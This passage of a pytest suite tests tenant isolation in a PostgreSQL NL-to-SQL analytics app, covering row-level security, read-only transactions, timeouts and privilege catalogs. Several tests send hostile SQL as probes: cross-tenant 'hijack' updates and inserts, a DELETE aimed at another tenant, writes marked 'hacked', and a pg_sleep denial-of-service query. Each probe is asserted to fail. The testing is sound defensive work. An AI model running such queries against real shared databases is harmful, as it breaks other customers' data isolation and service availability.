    # layer 2: inside the executor's read-only transaction -> 25006 first
    rls_role_conn.set_session(readonly=True, autocommit=False)
    try:
        with pytest.raises(psycopg2.errors.ReadOnlySqlTransaction) as ei:
            with rls_role_conn.cursor() as cur:
                cur.execute("SET LOCAL app.current_company_id = %s",
                            (str(co2),))
                cur.execute(f"UPDATE jobs SET status = 'hacked'"
                            f" WHERE company_id = {co2}")
        assert ei.value.pgcode == "25006"
        assert "read-only transaction" in str(ei.value)
    finally:
        rls_role_conn.rollback()
        rls_role_conn.set_session(readonly=False, autocommit=False)
    assert fetch_one(sup, "SELECT COUNT(*) FROM jobs")[0] == jobs_total

    # layer 3: RLS WITH CHECK, probed with deliberately widened grants
    with sup.cursor() as cur:
        cur.execute("GRANT UPDATE, INSERT, DELETE ON jobs TO nl2sql_reader")
    try:
        # 3a. cross-tenant hijack: WITH CHECK rejects the new row
        for stmt in (
                f"UPDATE jobs SET company_id = {co1}"
                f" WHERE company_id = {co2}",
                f"INSERT INTO jobs (company_id, job_number, customer_id,"
                f" job_type_id, status, job_date, quoted_price)"
                f" VALUES ({co1}, 'QAMT-HIJACK', NULL, NULL, 'completed',"
                f" DATE '2026-01-01', 1.00)"):
            with pytest.raises(psycopg2.errors.InsufficientPrivilege) as ei:
                with rls_role_conn.cursor() as cur:
                    cur.execute("SET LOCAL app.current_company_id = %s",
                                (str(co2),))
                    cur.execute(stmt)
            rls_role_conn.rollback()
            assert ei.value.pgcode == "42501"
            assert "row-level security" in str(ei.value), str(ei.value)
        assert fetch_one(sup, "SELECT COUNT(*) FROM jobs")[0] == jobs_total

        # 3b. hostile DELETE: USING hides the other workspace -> 0 rows
        #     (a self-scoped DELETE would match co2's own rows, but the
        #     fixture's jobs are referenced by labor_logs -- FK RESTRICT --
        #     so the DELETE-proof is the hostile-where one plus the
        #     rolled-back self-scoped UPDATE below)
        with rls_role_conn.cursor() as cur:
            cur.execute("SET LOCAL app.current_company_id = %s", (str(co2),))
            cur.execute(f"DELETE FROM jobs WHERE company_id = {co1}")
            assert cur.rowcount == 0
        rls_role_conn.rollback()
        assert fetch_one(sup, "SELECT COUNT(*) FROM jobs")[0] == jobs_total

        # 3c. self-scoped UPDATE: allowed by policy (own rows only) --
        #     pinned as documented semantics, then rolled back
        with rls_role_conn.cursor() as cur:
            cur.execute("SET LOCAL app.current_company_id = %s", (str(co2),))
            cur.execute(f"UPDATE jobs SET status = 'cancelled'"
                        f" WHERE company_id = {co2}")
            assert cur.rowcount == co2_jobs > 0
        rls_role_conn.rollback()
        assert fetch_one(sup, "SELECT COUNT(*) FROM jobs")[0] == jobs_total
    finally:
        with sup.cursor() as cur:
            cur.execute("REVOKE UPDATE, INSERT, DELETE ON jobs"
                        " FROM nl2sql_reader")
        rls_role_conn.rollback()
    # grants restored: the negative invariant holds again
    assert fetch_one(sup, "SELECT has_table_privilege('nl2sql_reader',"
                          " 'jobs', 'UPDATE')")[0] is False


def test_K16_timeout_reproof_through_role_path():
    """K16: pg_sleep(10) through the REAL run_readonly_query with a 2 s
    statement_timeout is aborted at ~2 s (NOT 10 s): the error says so, the
    elapsed wall clock and the executor's reported elapsed_ms agree, and no
    rows come back."""
    real_run = nl_to_sql.run_readonly_query
    t0 = time.perf_counter()
    res = real_run("SELECT pg_sleep(10), 1 AS one", query_timeout=2,
                   company_id=SESSION["co2"], db=scratch_database_url())
    wall = time.perf_counter() - t0
    assert res.get("error") == "query exceeded the 2-second timeout", res
    assert res["rows"] == [] and res["rowcount"] == 0
    assert 1.5 <= wall <= 9.0, wall
    assert 1500 <= res["elapsed_ms"] <= 9000, res["elapsed_ms"]


def test_K16_executor_readonly_blocks_writes():
    """K16b: writes through the REAL run_readonly_query are blocked by the
    read-only transaction layer ('blocked: the connection is read-only'),
    and the scratch table holds exactly the same rows afterwards."""
    sup = _scratch_pg_conn()
    (before,) = fetch_one(sup, "SELECT COUNT(*) FROM jobs")
    co2 = SESSION["co2"]
    for sql in (f"UPDATE jobs SET status = 'hacked' WHERE company_id = {co2}",
                f"INSERT INTO jobs (company_id, job_number) VALUES"
                f" ({co2}, 'QAMT-HACK')",
                f"DELETE FROM jobs WHERE company_id = {co2}"):
        res = nl_to_sql.run_readonly_query(sql, query_timeout=5,
                                           company_id=co2,
                                           db=scratch_database_url())
        assert res.get("error") == "blocked: the connection is read-only", \
            res.get("error")
        assert res["rows"] == []
    assert fetch_one(sup, "SELECT COUNT(*) FROM jobs")[0] == before


def test_K17_residual_visibility_table(rls_role_conn):
    """K17 (the documented threat-model boundary): what a restricted
    session CAN see WITHOUT a GUC. Pinned as an explicit table:
      ZERO (fail-closed):  8 client tables, companies registry, 5 scoped
                           views;
      DENIED (42501):      the 5 raw mv_* matviews;
      VISIBLE (global):    market data + global model audit + SoCal/peer
                           module data -- exactly the same rows the
                           superuser sees (no tenant data exists there);
      METADATA ONLY:       information_schema table/view names (PostgreSQL
                           grants these to every role by default; carries
                           NO tenant data; parser layer 1 blocks SELECTs
                           against it at the pipeline entry point).
    Global visibility does not change with a GUC either (pinned)."""
    sup = _scratch_pg_conn()
    sup.autocommit = True    # oracle connection: reads only

    def sup_count(rel):
        (n,) = fetch_one(sup, f"SELECT COUNT(*) FROM {rel}")
        return n

    # ZERO rows without a GUC
    for rel in RLS_PROOF_RELATIONS:
        n = _rls_count(rls_role_conn, f"SELECT COUNT(*) FROM {rel}")
        assert n == 0, f"{rel}: no-GUC role saw {n} rows (must be 0)"

    # raw matviews: permission denied, with or without a GUC
    for raw in RLS_RAW_MATVIEWS:
        with pytest.raises(psycopg2.errors.InsufficientPrivilege):
            _rls_count(rls_role_conn, f"SELECT COUNT(*) FROM {raw}")
        with pytest.raises(psycopg2.errors.InsufficientPrivilege):
            _rls_count(rls_role_conn, f"SELECT COUNT(*) FROM {raw}",
                       guc=SESSION["co2"])

    # GLOBAL relations: readable without a GUC, identical to the superuser
    co2 = SESSION["co2"]
    for rel in RLS_GLOBAL_VISIBLE:
        if fetch_one(sup, "SELECT to_regclass('public.' || %s) IS NOT NULL",
                     (rel,))[0] is not True:
            continue                    # module not installed in this DB
        n_role = _rls_count(rls_role_conn, f"SELECT COUNT(*) FROM {rel}")
        assert n_role == sup_count(rel), \
            f"{rel}: role saw {n_role}, superuser {sup_count(rel)}"
        # the boundary is GUC-independent: global data under GUC=co2 too
        n_guc = _rls_count(rls_role_conn, f"SELECT COUNT(*) FROM {rel}",
                           guc=co2)
        assert n_guc == n_role, f"{rel}: GUC changed global visibility"

    # companies registry: zero rows without a GUC (cannot even enumerate
    # the client list), exactly ONE row with it
    n = _rls_count(rls_role_conn, "SELECT COUNT(*) FROM companies")
    assert n == 0
    n = _rls_count(rls_role_conn, "SELECT COUNT(*) FROM companies", guc=co2)
    assert n == 1

    # METADATA ONLY: information_schema lists relation names to every role;
    # assert exactly that (names, no tenant data) and that the parser --
    # the layer actually guarding the pipeline -- rejects it (K14a).
    _, rows = _rls_select_all(
        rls_role_conn, "SELECT table_name FROM information_schema.tables")
    assert rows, "information_schema metadata is (documented) visible"
    assert all(isinstance(r[0], str) for r in rows)
    assert "QAMT" not in rows_to_text(rows)      # no tenant data, names only


def test_K_catalog_policy_expressions_fail_closed(conn):
    """K-CAT (catalog audit, scratch DB): the 9 policies are EXACTLY the
    tenant_isolation_* set on the 8 client tables + companies (no policy
    anywhere else), every USING and WITH CHECK expression is the fail-closed
    GUC comparison (pg_get_expr), and WITH CHECK is identical to USING."""
    rows = fetch_all(
        conn,
        "SELECT polname, polrelid::regclass::text, polcmd,"
        "       pg_get_expr(polqual, polrelid),"
        "       pg_get_expr(polwithcheck, polrelid)"
        " FROM pg_policy ORDER BY polname")
    assert len(rows) == 9, rows
    expected = {f"tenant_isolation_{t}": t for t in CLIENT_TABLES} | {
        "tenant_isolation_companies": "companies"}
    for polname, rel, polcmd, using, wcheck in rows:
        assert expected.get(polname) == rel, (polname, rel)
        assert polcmd == "*", polname            # ALL commands
        for expr in (using, wcheck):
            assert "company_id = " in expr, (polname, expr)
            assert ("NULLIF(current_setting('app.current_company_id'::text,"
                    " true)") in expr, (polname, expr)
            assert "::bigint" in expr, (polname, expr)
        assert wcheck == using, (polname, "WITH CHECK must equal USING")
    # RLS enabled on EXACTLY those 9 tables in the scratch DB (nothing
    # else in public carries RLS)
    rls_tables = {r[0] for r in fetch_all(
        conn, "SELECT relname FROM pg_class WHERE relrowsecurity"
              " AND relnamespace = 'public'::regnamespace")}
    assert rls_tables == set(CLIENT_TABLES) | {"companies"}, rls_tables


def test_K_catalog_scoped_views_barrier_and_file_drift(conn):
    """K-CAT: each scoped_* view carries security_barrier=true, its
    pg_get_viewdef embeds the exact fail-closed GUC predicate and reads
    FROM the right raw matview, and the definitions in
    migrations/002_add_rls.sql and analytics_views.sql are SEMANTICALLY
    identical to each other and to the DB (no drift)."""
    import re as _re
    sup = _scratch_pg_conn()

    def file_viewdefs(path):
        text = open(path, encoding="utf-8").read()
        out = {}
        for m in _re.finditer(
                r"CREATE\s+(?:OR\s+REPLACE\s+)?VIEW\s+(\w+)\s+"
                r"WITH\s*\(security_barrier\)\s+AS\s+(.*?);",
                text, _re.S | _re.I):
            out[m.group(1).lower()] = " ".join(m.group(2).split()).lower()
        return out

    mig = file_viewdefs(os.path.join(_BASE_DIR, "migrations",
                                     "002_add_rls.sql"))
    ana = file_viewdefs(os.path.join(_BASE_DIR, "analytics_views.sql"))
    for scoped in RLS_SCOPED_VIEWS:
        raw = "mv_" + scoped[len("scoped_"):]
        # catalog: security_barrier + predicate + FROM target
        opts = fetch_one(sup, "SELECT reloptions FROM pg_class"
                              " WHERE oid = %s::regclass", (scoped,))[0]
        assert opts is not None and "security_barrier=true" in opts, \
            (scoped, opts)
        viewdef = fetch_one(
            sup, "SELECT pg_get_viewdef(%s::regclass, true)",
            (scoped,))[0]
        assert f"from {raw}" in " ".join(viewdef.lower().split()), viewdef
        low = " ".join(viewdef.lower().split()).replace("::text", "")
        assert ("nullif(current_setting('app.current_company_id', true),"
                " '')::bigint") in low, viewdef
        # file drift: both files define it, identically, with the same idiom
        assert scoped in mig and scoped in ana, scoped
        assert mig[scoped] == ana[scoped], (
            f"DRIFT between migrations/002 and analytics_views.sql for "
            f"{scoped}:\n  002: {mig[scoped]}\n  ana: {ana[scoped]}")
        for fdef in (mig[scoped], ana[scoped]):
            assert f" from {raw} where company_id = nullif(" in fdef, fdef
            assert ("current_setting('app.current_company_id', true), '')"
                    "::bigint" in fdef), fdef


def test_K_catalog_grant_negatives_extended(conn):
    """K-CAT: the extended negative grant matrix on the scratch DB -- NO
    write/DDL privilege (INSERT/UPDATE/DELETE/TRUNCATE/REFERENCES/TRIGGER)
    on any client table, the companies registry, the scoped views or the
    raw matviews, and NO CREATE on the public schema or the database."""
    for rel in (CLIENT_TABLES + ("companies",) + RLS_SCOPED_VIEWS
                + RLS_RAW_MATVIEWS):
        for priv in ("INSERT", "UPDATE", "DELETE", "TRUNCATE",
                     "REFERENCES", "TRIGGER"):
            got = fetch_one(
                conn, "SELECT has_table_privilege('nl2sql_reader', %s, %s)",
                (rel, priv))[0]
            assert got is False, (rel, priv, "must be denied")
    assert fetch_one(conn, "SELECT has_schema_privilege('nl2sql_reader',"
                           " 'public', 'CREATE')")[0] is False
    assert fetch_one(conn, "SELECT has_database_privilege('nl2sql_reader',"
                           " current_database(), 'CREATE')")[0] is False


# ===========================================================================
# Dashboard structural smoke (AppTest; read-only against the live app DB)
# ===========================================================================
EXPECTED_TAB_LABELS = [
    "Overview", "Charts", "Anomaly alerts", "Ingest CSVs",
    "Pricing simulator", "SoCal Benchmarks", "Forecast & cash runway",
    "SoCal Capital & Deals", "Public Peer Financials", "Ask Your Data",
]


def test_dashboard_apptest_ten_tabs_no_exceptions_workspace_selector():
    """READ-ONLY AppTest render: 10 tabs, zero exceptions, zero st.error
    banners, and the sidebar 'Client workspace' selector present (the
    multi-tenant surface). Skipped when the dashboard deps or the live DB
    are unavailable."""
    try:
        import pandas   # noqa: F401
        import plotly   # noqa: F401
        from streamlit.testing.v1 import AppTest
    except ImportError as exc:
        pytest.skip(f"dashboard dependencies unavailable: {exc}")
    try:
        probe = psycopg2.connect(LIVE_WAREHOUSE_URL, connect_timeout=3)
        probe.close()
    except Exception as exc:  # noqa: BLE001
        pytest.skip(f"live smb_warehouse not reachable: {exc!r}")

    # The in-process render legitimately uses the modules' DEFAULT DBs
    # (Overview generates the Executive PDF Brief through
    # generate_pdf_brief.DB), so lift the guard for the render and
    # re-apply it afterwards.
    for attr, mod in (("fe.DB", fe), ("gpdf.DB", gpdf),
                      ("ingest_csv.DB", ingest_csv),
                      ("nl_to_sql.DB_URL", nl_to_sql)):
        setattr(mod, attr.split(".", 1)[1], _SAVED_MODULE_DBS[attr])
    try:
        at = AppTest.from_file(APP_PATH, default_timeout=120)
        at.run()
    finally:
        fe.DB = gpdf.DB = ingest_csv.DB = _GUARD_DB
        nl_to_sql.DB_URL = _GUARD_DB
    assert not at.exception, f"app.py raised: {at.exception}"
    assert [t.label for t in at.tabs] == EXPECTED_TAB_LABELS
    assert len(at.error) == 0, (
        f"unexpected st.error banner(s): {[e.value for e in at.error]}")
    selectboxes = [sb for sb in at.sidebar.selectbox
                   if sb.label == "Client workspace"]
    assert selectboxes, (
        "the sidebar must expose the 'Client workspace' selector")
    # the selector offers the live demo workspace
    assert any("BrightPath Works (Demo)" in str(opt)
               for sb in selectboxes for opt in sb.options)


# ===========================================================================
# J) Live-DB hygiene probe (READ-ONLY)
# ===========================================================================
def test_J_live_hygiene_probe():
    """The LIVE warehouse stays single-tenant-clean: companies == 1 (the
    demo workspace), all 12 documented baseline counts intact, and ZERO
    rows with company_id <> 1 (or NULL) in any of the 8 client tables.
    READ-ONLY; skips when the live DB is unreachable."""
    try:
        live = psycopg2.connect(LIVE_WAREHOUSE_URL, connect_timeout=5)
    except Exception as exc:  # noqa: BLE001
        pytest.skip(f"live smb_warehouse not reachable: {exc!r}")
    live.set_session(readonly=True, autocommit=True)   # defense in depth
    try:
        with live.cursor() as cur:
            cur.execute("SELECT company_name FROM companies")
            rows = cur.fetchall()
            assert len(rows) == 1, f"live companies must hold exactly 1 row: {rows}"
            assert rows[0][0] == DEMO_COMPANY_NAME

            got = {}
            cur.execute("SELECT COUNT(*) FROM anomaly_alerts"
                        " WHERE NOT is_resolved")
            got["anomaly_alerts_open"] = cur.fetchone()[0]
            cur.execute("SELECT COUNT(*) FROM mv_customer_profitability"
                        " WHERE is_whale")
            got["whales"] = cur.fetchone()[0]
            for table in ("jobs", "anomaly_alerts", "market_benchmarks",
                          "financial_ledger", "labor_logs", "forecasts",
                          "backtest_results", "customers", "employees",
                          "job_types"):
                cur.execute(f"SELECT COUNT(*) FROM {table}")
                got[table] = cur.fetchone()[0]
            for key, expected in LIVE_BASELINE.items():
                assert got[key] == expected, (
                    f"live baseline drifted: {key} = {got[key]}"
                    f" (expected {expected})")

            # the isolation sweep: zero cross-tenant rows on the live DB
            for table in CLIENT_TABLES:
                cur.execute(f"SELECT COUNT(*) FROM {table}"
                            " WHERE company_id <> 1 OR company_id IS NULL")
                n = cur.fetchone()[0]
                assert n == 0, (
                    f"live {table}: {n} row(s) outside workspace 1!")
    finally:
        live.close()


# ===========================================================================
# Final scratch-state residue check
# ===========================================================================
def test_final_scratch_state_consistent(conn):
    """After the whole suite: only the two intentional workspaces remain,
    every client-table row belongs to one of them, mutating tests cleaned
    up after themselves, and the matviews re-refreshed still hold exactly
    the seeded rows."""
    co1, co2 = SESSION["co1"], SESSION["co2"]
    rows = fetch_all(conn, "SELECT company_id, company_name FROM companies"
                           " ORDER BY company_id")
    assert rows == [(co1, DEMO_COMPANY_NAME), (co2, CO2_NAME)], rows

    expected_totals = {
        "customers": 3 + 2, "job_types": 2 + 1, "employees": 2 + 1,
        "jobs": 6 + 2, "financial_ledger": 22 + 10, "labor_logs": 12 + 2,
        "anomaly_alerts": 1,          # C1's company-2 materials spike only
        "forecasts": 0,               # G cleaned up
    }
    for table, total in expected_totals.items():
        (got,) = fetch_one(conn, f"SELECT COUNT(*) FROM {table}")
        assert got == total, f"{table}: {got} rows (expected {total})"
        (outside,) = fetch_one(conn, f"SELECT COUNT(*) FROM {table}"
                                     " WHERE company_id NOT IN (%s, %s)",
                               (co1, co2))
        assert outside == 0, f"{table} holds rows outside the 2 workspaces"

    # no residue from the mutating tests:
    for marker in ("QAMT-shared-spike-cat", "QAMT-ingest-probe",
                   "QAMT1-fc-revenue", "QAMT2-fc-revenue", "QAMT-default-cat"):
        (n,) = fetch_one(conn, "SELECT COUNT(*) FROM financial_ledger"
                               " WHERE category = %s", (marker,))
        assert n == 0, f"residue: {marker}"
    (iso,) = fetch_one(conn, "SELECT COUNT(*) FROM companies"
                             " WHERE company_name = 'QA Iso Client'")
    assert iso == 0
    (throwaway,) = fetch_one(conn, "SELECT COUNT(*) FROM companies"
                                   " WHERE company_name LIKE 'QAMT Throwaway%'")
    assert throwaway == 0

    refresh_analytics(conn)
    for mv, expected in (("mv_job_type_profitability", 3),
                         ("mv_labor_cost_analysis", 8),
                         ("mv_customer_profitability", 5),
                         ("mv_monthly_summary", 14),
                         ("mv_benchmark_comparison", 13)):
        (got,) = fetch_one(conn, f"SELECT COUNT(*) FROM {mv}")
        assert got == expected, f"{mv}: {got} rows (expected {expected})"
